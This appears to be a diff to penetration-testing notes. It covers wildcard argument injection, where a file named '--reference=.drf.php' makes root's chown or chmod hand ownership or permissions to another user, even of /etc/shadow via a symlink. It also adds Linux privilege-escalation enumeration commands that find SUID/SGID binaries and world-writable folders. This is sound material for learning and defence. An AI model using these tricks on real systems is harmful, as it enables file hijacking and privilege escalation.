-     root@defensecode public]# ls -al
-     total 52
-     drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
-     drwx------. 22 user user 4096 Oct 28 17:34 ..
-     -rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
-     -rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
-     -rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
-     -rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
-     -rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
-     -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-     -rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
-     -rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
-     -rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
-     -rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
-     -rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
-     -rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
-     -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
+   root@defensecode public]# ls -al
+   total 52
+   drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
+   drwx------. 22 user user 4096 Oct 28 17:34 ..
+   -rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
+   -rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
+   -rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
+   -rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
+   -rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
+   -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
+   -rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
+   -rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
+   -rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
+   -rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
+   -rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
+   -rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
+   -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
      -rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
      -rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php
 
 
-   Something is not right... What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group 'nobody', but somehow, all files are owned by the user 'leon' now. If we take closer look, this directory previously contained just the following two files created and owned by the user 'leon'.
+ Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group 'nobody', but somehow, all files are owned by the user 'leon' now. If we take closer look, this directory previously contained just the following two files created and owned by the user 'leon'.
 
-  :: 
+ :: 
 
-    -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-    -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
+   -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
+   -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
 
-  Thing is that wildcard character used in 'chown' command line took arbitrary '--reference=.drf.php' file and passed it to the chown command at the command line as an option.
+ Thing is that wildcard character used in 'chown' command line took arbitrary '--reference=.drf.php' file and passed it to the chown command at the command line as an option.
 
-  Let's check chown manual page (man chown):
+ Let's check chown manual page (man chown):
 
-  :: 
+ :: 
 
-     --reference=RFILE
-     use RFILE's owner and group rather than specifying OWNER:GROUP values
+   --reference=RFILE     use RFILE's owner and group rather than specifying OWNER:GROUP values
 
+ So in this case, '--reference' option to 'chown' will override 'nobody:nobody' specified as the root, and new owner of files in this directory will be exactly same as the owner of '.drf.php', which is in this case user 'leon'. Just for the record, '.drf' is short for Dummy Reference File. :)
 
-   So in this case, '--reference' option to 'chown' will override 'nobody:nobody' specified as the root, and new owner of files in this
-		directory will be exactly same as the owner of '.drf.php', which is in this case user 'leon'. Just for the record, '.drf' is short for Dummy Reference File. :)
+ To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument	to the --reference option, file that's owned by some other user, not 'leon', in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically "hijack" files that are of interest to us.
 
-		To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument 			to the --reference option, file that's owned by some other user, not 'leon', in that case he would become owner of all files in this 			directory. With	this simple chown parameter pollution, we can trick root into changing	ownership of files to arbitrary users, and practically "hijack" files that are of interest to us.
-
-		Even more, if user 'leon' previously created a symbolic link in that directory that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed to the user 'leon'.
+ Even more, if user 'leon' previously created a symbolic link in that directory that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed to the user 'leon'.
 
 
- * **Chmod file reference trick**
+* **Chmod file reference trick**
 
-  Another interesting attack vector similar to previously described 'chown' attack is 'chmod'. Chmod also has --reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):
+ Another interesting attack vector similar to previously described 'chown' attack is 'chmod'. Chmod also has --reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):
 
-  :: 
+ :: 
 
     --reference=RFILE    :   use RFILE's mode instead of MODE values
 
@@ -930,9 +921,45 @@ Unprivileged shell to privileged shell
     [root@defensecode public]# cat shell.c
     /usr/bin/id > shell_output.txt
 
+Privilege esclation from g0tm1lk blog
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+* What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
+
+ ::
+
+   find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+   find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+   find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+   find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+   for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+   # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+ 
+* Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
+
+ ::
+
+   find / -writable -type d 2>/dev/null      # world-writeable folders
+   find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+   find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+
+   find / -perm -o x -type d 2>/dev/null     # world-executable folders
+
+   find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+* Any "problem" files? Word-writeable, "nobody" files
+
+ ::
+
+   find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+   find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
 
 Tips and Tricks
-***************
+---------------
 
 * run-parts 
 
